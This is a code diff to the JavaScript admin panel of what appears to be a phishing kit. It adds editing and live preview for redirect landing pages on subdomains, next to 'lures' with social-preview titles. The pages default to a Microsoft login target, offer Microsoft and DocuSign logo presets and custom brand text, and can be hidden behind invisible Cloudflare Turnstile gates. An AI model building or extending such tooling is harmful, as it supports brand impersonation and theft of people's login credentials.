@@ -155,7 +155,8 @@ async function mgRedirects() {
     return '<tr><td class="mono dim">#' + r.id + '</td><td class="mono">' + esc(r.host) + '</td>' +
       '<td class="mono">' + esc(r.file) + '</td><td class="mono trunc">' + esc(r.target_url || '—') + '</td>' +
       '<td>' + (r.turnstile ? '<span class="badge warn">' + esc(r.turnstile_type || 'on') + '</span>' : '<span class="badge mut">off</span>') + '</td>' +
-      '<td class="right"><button class="btn xs sm" data-act="mg-redir-preview" data-id="' + esc(r.host) + '" data-file="' + esc(r.file) + '">Preview</button>' +
+      '<td class="right actions"><button class="btn xs sm" data-act="mg-redir-edit" data-id="' + r.id + '">Edit</button>' +
+      '<button class="btn xs sm" data-act="mg-redir-preview" data-id="' + esc(r.host) + '">Open</button>' +
       '<button class="btn xs sm danger" data-act="mg-redir-del" data-id="' + r.id + '">Del</button></td></tr>';
   }).join('') || '<tr><td colspan="6" class="dim center">none configured</td></tr>';
 
@@ -339,14 +340,26 @@ Object.assign(ACTIONS, {
   'mg-auto-notify': function (id, el) { run(async function () { await API.post(ep('autolures/' + id + '/notify'), { on: el.getAttribute('data-on') === '1' }); mgRefresh(); }); },
 
   'mg-redir-new': function (slug) { mgNewRedirect(slug); },
+  'mg-redir-edit': function (id) { mgRedirEdit(Number(id)); },
   'mg-redir-save': function () {
     run(async function () {
-      await API.post(ep('redirects'), {
-        subdomain: $('#mgRSub').value.trim(), template: $('#mgRTpl').value, target_url: $('#mgRUrl').value.trim(),
-        turnstile: $('#mgRTs').checked, turnstile_pos: $('#mgRPos').value, turnstile_type: $('#mgRType').value,
-        turnstile_theme: $('#mgRTheme').value, delay: parseInt($('#mgRDelay').value || '3', 10)
-      });
+      var body = mgRedirCollect();
+      var tpl = body.template; delete body.template;
+      body.template = tpl;
+      await API.post(ep('redirects'), body);
       toast('created', 'ok'); closeModal(); mgRefresh();
+    });
+  },
+  'mg-redir-update': function (id) {
+    run(async function () {
+      var body = mgRedirCollect();
+      await API.post(ep('redirects/' + id + '/edit'), {
+        target_url: body.target_url, delay: body.delay, turnstile: body.turnstile,
+        turnstile_pos: body.turnstile_pos, turnstile_type: body.turnstile_type, turnstile_theme: body.turnstile_theme,
+        brand: body.brand, title: body.title, subtitle: body.subtitle, accent: body.accent,
+        logo: body.logo, button: body.button, messages: body.messages
+      });
+      toast('saved', 'ok'); closeModal(); mgRefresh();
     });
   },
   'mg-redir-del': function (id) { if (confirm('Delete redirect #' + id + '?')) run(async function () { await API.del(ep('redirects/' + id)); mgRefresh(); }); },
@@ -399,30 +412,111 @@ function mgEditLure(l) {
     f('og_title', 'og_title', l.og_title) + f('og_desc', 'og_desc', l.og_desc) +
     '<div class="actions"><button class="btn primary" data-act="mg-lure-save" data-id="' + l.id + '">Save</button></div>');
 }
+function mgRedirTemplateURL(slug, o) {
+  var msgs = o.messages;
+  if (Object.prototype.toString.call(msgs) === '[object Array]') msgs = msgs.join('\n');
+  var q = '?target=' + encodeURIComponent(o.target || '') +
+    '&delay=' + encodeURIComponent(o.delay || '3') +
+    '&brand=' + encodeURIComponent(o.brand || '') +
+    '&title=' + encodeURIComponent(o.title || '') +
+    '&subtitle=' + encodeURIComponent(o.subtitle || '') +
+    '&accent=' + encodeURIComponent(o.accent || '') +
+    '&logo=' + encodeURIComponent(o.logo || '') +
+    '&button=' + encodeURIComponent(o.button || '') +
+    '&messages=' + encodeURIComponent((msgs || '').split('\n').join('|'));
+  if (o.turnstile) {
+    q += '&turnstile=1&turnstile_pos=' + encodeURIComponent(o.turnstile_pos || 'slot') +
+      '&turnstile_type=' + encodeURIComponent(o.turnstile_type || 'managed') +
+      '&turnstile_theme=' + encodeURIComponent(o.turnstile_theme || 'auto');
+  }
+  return ep('redirect-templates/' + encodeURIComponent(slug) + q);
+}
+
+function mgRedirFields(o, isEdit) {
+  var logos = ['mark', 'microsoft', 'docusign', 'cloud', 'file', 'ring', 'none'];
+  function f(id, label, val, hint, type) {
+    return '<div class="field"><label>' + label + '</label><input id="' + id + '" data-mgr="' + id + '" type="' + (type || 'text') + '" value="' + esc(val || '') + '">' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>';
+  }
+  return '' +
+    '<div class="row"><div class="field" style="flex:1"><label>Subdomain</label><input id="mgRSub" value="' + esc(o.subdomain || '') + '"' + (isEdit ? ' disabled' : '') + '><span class="hint">https://&lt;sub&gt;.domain</span></div>' +
+    '<div class="field" style="flex:2"><label>Target URL</label><input id="mgRUrl" data-mgr="mgRUrl" value="' + esc(o.target_url || '') + '" placeholder="https://login.microsoftonline.com/"></div></div>' +
+    '<div class="row"><div class="field"><label>Template</label><select id="mgRTpl">' + (o.templateOptions || '') + '</select></div>' +
+    '<div class="field" style="max-width:120px"><label>Delay (s)</label><input id="mgRDelay" data-mgr="mgRDelay" type="number" min="1" max="30" value="' + esc(o.delay || 3) + '"></div>' +
+    '<div class="field" style="max-width:150px"><label>Turnstile</label><label class="switch" style="margin-top:6px"><input type="checkbox" id="mgRTs" data-mgr="mgRTs"' + (o.turnstile ? ' checked' : '') + '><span class="track"></span><span class="muted">gate</span></label></div></div>' +
+    '<details class="mb14"><summary class="muted" style="cursor:pointer;font-size:12.5px">Turnstile placement</summary>' +
+      '<div class="row mt8"><div class="field"><label>Position</label><select id="mgRPos" data-mgr="mgRPos">' +
+        ['slot', 'inline', 'overlay', 'center', 'bottom', 'corner'].map(function (x) { return '<option' + (o.turnstile_pos === x ? ' selected' : '') + '>' + x + '</option>'; }).join('') + '</select></div>' +
+      '<div class="field"><label>Type</label><select id="mgRType" data-mgr="mgRType">' +
+        ['managed', 'non-interactive', 'invisible'].map(function (x) { return '<option' + (o.turnstile_type === x ? ' selected' : '') + '>' + x + '</option>'; }).join('') + '</select></div>' +
+      '<div class="field"><label>Theme</label><select id="mgRTheme" data-mgr="mgRTheme">' +
+        ['auto', 'light', 'dark'].map(function (x) { return '<option' + (o.turnstile_theme === x ? ' selected' : '') + '>' + x + '</option>'; }).join('') + '</select></div></div>' +
+    '</details>' +
+    '<div class="row"><div class="field"><label>Brand / wordmark</label><input id="mgRBrand" data-mgr="mgRBrand" value="' + esc(o.brand || '') + '"></div>' +
+    '<div class="field" style="max-width:150px"><label>Accent</label><input id="mgRAccent" data-mgr="mgRAccent" value="' + esc(o.accent || '') + '" placeholder="#0067b8"></div>' +
+    '<div class="field" style="max-width:170px"><label>Logo</label><input id="mgRLogo" data-mgr="mgRLogo" list="mgLogoList" value="' + esc(o.logo || '') + '" placeholder="or an image URL"><datalist id="mgLogoList">' + logos.map(function (l) { return '<option value="' + l + '">'; }).join('') + '</datalist></div></div>' +
+    f('mgRTitle', 'Title', o.title, '') +
+    f('mgRSubtitle', 'Subtitle', o.subtitle, '') +
+    f('mgRButton', 'Button label', o.button, 'used by templates with a button') +
+    '<div class="field"><label>Status lines (one per line)</label><textarea id="mgRMsgs" data-mgr="mgRMsgs" rows="3">' + esc((o.messages || []).join('\n')) + '</textarea></div>' +
+    '<div class="field"><label>Preview</label><iframe id="mgPrev" style="width:100%;height:240px;border:1px solid var(--border);border-radius:10px;background:#fff" src="' + (o.previewURL || '') + '"></iframe></div>' +
+    '<div class="actions"><button class="btn primary" data-act="' + (isEdit ? 'mg-redir-update' : 'mg-redir-save') + '" data-id="' + (o.id || '') + '">' + (isEdit ? 'Save changes' : 'Create') + '</button></div>';
+}
+
+function mgRedirCollect() {
+  function v(id) { var e = document.getElementById(id); return e ? e.value.trim() : ''; }
+  function c(id) { var e = document.getElementById(id); return e && e.checked; }
+  return {
+    subdomain: v('mgRSub'), target_url: v('mgRUrl'), delay: parseInt(v('mgRDelay') || '3', 10),
+    template: (document.getElementById('mgRTpl') || {}).value || '',
+    turnstile: c('mgRTs'), turnstile_pos: v('mgRPos') || 'slot', turnstile_type: v('mgRType') || 'managed', turnstile_theme: v('mgRTheme') || 'auto',
+    brand: v('mgRBrand'), title: v('mgRTitle'), subtitle: v('mgRSubtitle'), accent: v('mgRAccent'),
+    logo: v('mgRLogo'), button: v('mgRButton'),
+    messages: v('mgRMsgs') ? v('mgRMsgs').split('\n') : []
+  };
+}
+
+var mgPrevT = null;
+function mgRedirPreview() {
+  clearTimeout(mgPrevT);
+  mgPrevT = setTimeout(function () {
+    var o = mgRedirCollect();
+    var f = document.getElementById('mgPrev');
+    if (f) f.src = mgRedirTemplateURL(o.template || 'clean-redirect', o);
+  }, 350);
+}
+
 function mgNewRedirect(slug) {
   run(async function () {
     var d = await API.get(ep('redirect-templates'));
     if (!d.templates.length) { toast('no templates', 'err'); return; }
     var sel = slug || d.templates[0].slug;
-    function turl(s) { return ep('redirect-templates/' + encodeURIComponent(s) + '?target=https://login.microsoftonline.com/'); }
-    var opts = d.templates.map(function (t) {
-      return '<option value="' + esc(t.slug) + '" data-url="' + turl(t.slug) + '">' + esc(t.title) + ' (' + esc(t.category) + ')</option>';
-    }).join('');
-    openModal('New redirect',
-      '<div class="row"><div class="field" style="flex:2"><label>Subdomain</label><input id="mgRSub" placeholder="landing"></div>' +
-      '<div class="field" style="flex:3"><label>Template</label><select id="mgRTpl" onchange="document.getElementById(\'mgPrev\').src=this.options[this.selectedIndex].getAttribute(\'data-url\')">' + opts + '</select></div></div>' +
-      '<div class="field"><label>Target URL (empty = none)</label><input id="mgRUrl" placeholder="https://login.microsoftonline.com/"></div>' +
-      '<div class="row"><div class="field"><label>Delay (s)</label><input id="mgRDelay" type="number" min="1" max="30" value="3"></div>' +
-      '<div class="field"><label>Turnstile</label><label class="switch" style="margin-top:6px"><input type="checkbox" id="mgRTs"><span class="track"></span><span class="muted">gate</span></label></div></div>' +
-      '<div class="row"><div class="field"><label>Turnstile position</label><select id="mgRPos">' +
-        ['slot', 'inline', 'overlay', 'center', 'bottom', 'corner'].map(function (x) { return '<option value="' + x + '">' + x + '</option>'; }).join('') + '</select></div>' +
-      '<div class="field"><label>Type</label><select id="mgRType">' +
-        ['managed', 'non-interactive', 'invisible'].map(function (x) { return '<option value="' + x + '">' + x + '</option>'; }).join('') + '</select></div>' +
-      '<div class="field"><label>Theme</label><select id="mgRTheme">' +
-        ['auto', 'light', 'dark'].map(function (x) { return '<option value="' + x + '">' + x + '</option>'; }).join('') + '</select></div></div>' +
-      '<div class="field"><label>Preview</label><iframe id="mgPrev" style="width:100%;height:230px;border:1px solid var(--border);border-radius:10px;background:#fff" src="' + turl(sel) + '"></iframe></div>' +
-      '<div class="actions"><button class="btn primary" data-act="mg-redir-save">Create</button></div>');
-    var s = document.getElementById('mgRTpl'); if (s) s.value = sel;
+    var opts = d.templates.map(function (t) { return '<option value="' + esc(t.slug) + '"' + (t.slug === sel ? ' selected' : '') + '>' + esc(t.title) + ' (' + esc(t.category) + ')</option>'; }).join('');
+    var meta = d.templates.filter(function (t) { return t.slug === sel; })[0] || {};
+    var o = {
+      template: sel, templateOptions: opts, delay: meta.delay || 3,
+      accent: meta.accent || '', logo: meta.logo || '', brand: meta.brand || '',
+      title: meta.title_text || '', subtitle: meta.subtitle || '', button: meta.button || '',
+      messages: meta.messages || [], turnstile_pos: 'slot', turnstile_type: 'managed', turnstile_theme: 'auto',
+      previewURL: mgRedirTemplateURL(sel, { delay: meta.delay || 3, accent: meta.accent, logo: meta.logo, brand: meta.brand, title: meta.title_text, subtitle: meta.subtitle, button: meta.button, messages: (meta.messages || []).join('\n') })
+    };
+    openModal('New redirect', mgRedirFields(o, false));
+    var s = document.getElementById('mgRTpl');
+    if (s) s.onchange = mgRedirPreview;
+    $$('[data-mgr]').forEach(function (el) { el.addEventListener('input', mgRedirPreview); el.addEventListener('change', mgRedirPreview); });
+  });
+}
+
+function mgRedirEdit(id) {
+  run(async function () {
+    var list = await API.get(ep('redirects'));
+    var r = list.redirects.filter(function (x) { return x.id === id; })[0];
+    if (!r) { toast('not found', 'err'); return; }
+    var d = await API.get(ep('redirect-templates'));
+    var opts = d.templates.map(function (t) { return '<option value="' + esc(t.slug) + '"' + (t.slug === r.template ? ' selected' : '') + '>' + esc(t.title) + '</option>'; }).join('');
+    r.templateOptions = opts;
+    r.previewURL = mgRedirTemplateURL(r.template || 'clean-redirect', r);
+    openModal('Edit redirect · ' + esc(r.host), mgRedirFields(r, true));
+    $$('[data-mgr]').forEach(function (el) { el.addEventListener('input', mgRedirPreview); el.addEventListener('change', mgRedirPreview); });
   });
 }
 
